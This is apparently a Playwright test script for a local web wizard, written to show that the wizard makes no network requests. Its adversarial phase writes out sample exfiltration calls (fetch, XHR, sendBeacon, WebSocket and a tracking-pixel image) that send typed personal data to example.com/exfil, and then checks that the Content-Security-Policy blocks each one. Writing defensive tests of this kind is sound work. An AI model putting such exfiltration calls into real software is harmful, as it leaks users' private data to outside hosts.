/**
 * no-network.mjs — proves the wizard never phones home.
 *
 * Loads web/index.html from disk (file://, so there is no server to talk to) and
 * runs two phases:
 *
 *   Phase 1 — NORMAL USE. Fill the interview with personal data and generate the
 *             deployment spec. Assertion: the browser attempts ZERO external
 *             requests. Not "blocked" — never even attempted.
 *
 *   Phase 2 — ADVERSARIAL. Deliberately try to exfiltrate that data over fetch,
 *             XHR, WebSocket, sendBeacon and a tracking pixel. Assertion: the
 *             Content-Security-Policy blocks every channel and not one of them
 *             receives a response.
 *
 * Phase 1 is the promise. Phase 2 is the enforcement that backs it up, and it is
 * why the CSP exists: even if a future edit introduced network code by accident,
 * the browser would refuse to send it.
 *
 * Run:  npm install --no-save playwright && npx playwright install chromium
 *       node tests/no-network.mjs
 *
 * Requires Playwright. The dependency-free structural checks live in validate.mjs.
 */
import { chromium } from 'playwright';
import { pathToFileURL, fileURLToPath } from 'node:url';
import { resolve, dirname } from 'node:path';

const here = dirname(fileURLToPath(import.meta.url));
const PAGE = pathToFileURL(resolve(here, '..', 'web', 'index.html')).href;

const isLocal = u => u.startsWith('file://') || u.startsWith('data:') || u.startsWith('blob:');

let phase = 'setup';
const attempts = [];   // every request the browser tried, tagged by phase
const responses = [];  // anything that actually came back from a remote host
const failed = [];     // requests that failed, with the reason
const pageErrors = [];

let failures = 0;
const check = (name, ok, detail = '') => {
  console.log(`  ${ok ? '✓' : '✗'} ${name}${detail ? ' — ' + detail : ''}`);
  if (!ok) failures++;
};

const browser = await chromium.launch(process.env.PLAYWRIGHT_CHANNEL
  ? { channel: process.env.PLAYWRIGHT_CHANNEL } : {});
const page = await browser.newPage();
page.on('pageerror', error => pageErrors.push(error.message));

page.on('request', r => { if (!isLocal(r.url())) attempts.push({ phase, url: r.url(), type: r.resourceType() }); });
page.on('websocket', ws => { if (!isLocal(ws.url())) attempts.push({ phase, url: ws.url(), type: 'websocket' }); });
page.on('response', r => { if (!isLocal(r.url())) responses.push({ phase, url: r.url(), status: r.status() }); });
page.on('requestfailed', r => { if (!isLocal(r.url())) failed.push({ url: r.url(), reason: r.failure()?.errorText || '?' }); });

await page.goto(PAGE);
await page.evaluate(() => {
  window.__violations = [];
  document.addEventListener('securitypolicyviolation', e =>
    window.__violations.push({ directive: e.violatedDirective, blocked: e.blockedURI }));
});

console.log('\nHermes Soulmate — no-network proof\n');

// ── Phase 1: normal use, with real-looking personal data ──────────────────
phase = 'normal-use';

await page.evaluate(() => {
  const setI = (el, v) => { const s = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set; s.call(el, v); el.dispatchEvent(new Event('input', { bubbles: true })); };
  const setS = (el, v) => { const s = Object.getOwnPropertyDescriptor(HTMLSelectElement.prototype, 'value').set; s.call(el, v); el.dispatchEvent(new Event('change', { bubbles: true })); };
  const first = document.querySelector('.card input[type=text]');
  if (first) setI(first, 'Jordan Reyes');
  const row = [...document.querySelectorAll('.repeater-row')].find(r => r.querySelector('input[data-rfid$=".name"]'));
  if (row) {
    setS(row.querySelector('select[data-rfid$=".relationship"]'), 'spouse');
    setI(row.querySelector('input[data-rfid$=".name"]'), 'Alex Reyes');
    setI(row.querySelector('input[data-rfid$=".occupation"]'), 'Cardiologist');
  }
});
await page.waitForTimeout(300);

// Revisiting a skipped section must retain answers and allow it back into exports.
await page.locator('[data-fid="identity.fullName"]').fill('Jordan Reyes');
await page.locator('#skip').click();
await page.locator('#back').click();
check('skipped section retains its editable answers',
  await page.locator('[data-fid="identity.fullName"]').inputValue() === 'Jordan Reyes');
await page.locator('[data-fid="identity.fullName"]').fill('Jordan Example');
check('editing a skipped section restores it for export',
  await page.evaluate(() => !state.skipped.identity));
await page.locator('#skip').click();
await page.locator('#back').click();
await page.locator('#next').click();
check('Next restores a skipped section without requiring edits',
  await page.evaluate(() => !state.skipped.identity));

for (let i = 0; i < 30; i++) {
  if (pageErrors.length) break;
  if (await page.locator('#dl-sh').count()) break;
  await page.locator('#next').click();
}
check('browser renders without JavaScript errors', pageErrors.length === 0, pageErrors.join('; '));
if (pageErrors.length) {
  await browser.close();
  process.exit(1);
}
await page.locator('#dl-sh').waitFor();

const filesGenerated = await page.evaluate(() =>
  document.querySelectorAll('.file-tree li, .file-item, [data-file]').length);
check('interview filled and deployment spec generated', filesGenerated > 0, `${filesGenerated} files`);

const downloadReady = page.waitForEvent('download');
await page.locator('#dl-sh').click();
const download = await downloadReady;
check('installer download completes', download.suggestedFilename() === 'setup-fleet.sh' &&
  await download.failure() === null);

const normalAttempts = attempts.filter(a => a.phase === 'normal-use');
check('NORMAL USE: zero external requests even attempted', normalAttempts.length === 0,
  normalAttempts.length ? JSON.stringify(normalAttempts.slice(0, 5)) : 'the browser never reached for the network');

// ── Phase 2: adversarial. Try to leak the data we just typed. ─────────────
phase = 'exfil-attempt';

await page.evaluate(async () => {
  const secret = 'wife=Alex+Reyes&doctor=Cardiologist';
  try { await fetch('https://example.com/exfil?' + secret); } catch {}
  try { const x = new XMLHttpRequest(); x.open('POST', 'https://example.com/exfil'); x.send(secret); } catch {}
  try { navigator.sendBeacon('https://example.com/exfil', secret); } catch {}
  try { new WebSocket('wss://example.com/exfil'); } catch {}
  try { new Image().src = 'https://example.com/pixel.gif?' + secret; } catch {}
  await new Promise(r => setTimeout(r, 600));
});
await page.waitForTimeout(700);

const v = await page.evaluate(() => window.__violations || []);
const connectBlocked = v.filter(x => x.directive === 'connect-src').length;
const imgBlocked = v.filter(x => x.directive === 'img-src').length;

check('CSP blocked fetch / XHR / WebSocket / sendBeacon', connectBlocked >= 4, `${connectBlocked} connect-src violations`);
check('CSP blocked the tracking pixel', imgBlocked >= 1, `${imgBlocked} img-src violation`);

// The decisive one: nothing, in either phase, ever got a reply from a remote host.
check('no remote host ever responded', responses.length === 0,
  responses.length ? JSON.stringify(responses.slice(0, 3)) : 'no bytes came back from anywhere');

const unblocked = attempts.filter(a => a.phase === 'exfil-attempt' && !failed.some(f => f.url === a.url));
check('every exfil attempt was blocked in flight', unblocked.length === 0,
  unblocked.length ? JSON.stringify(unblocked) : `${failed.length} blocked: ${[...new Set(failed.map(f => f.reason))].join(', ') || 'by CSP'}`);

await browser.close();

const total = attempts.length;
console.log(`\n${failures ? 'FAIL' : 'PASS'} — ${normalAttempts.length} request(s) during normal use, ` +
            `${total - normalAttempts.length} deliberate exfil attempt(s) all blocked, ` +
            `${responses.length} response(s) from any remote host.\n`);
process.exit(failures ? 1 : 0);
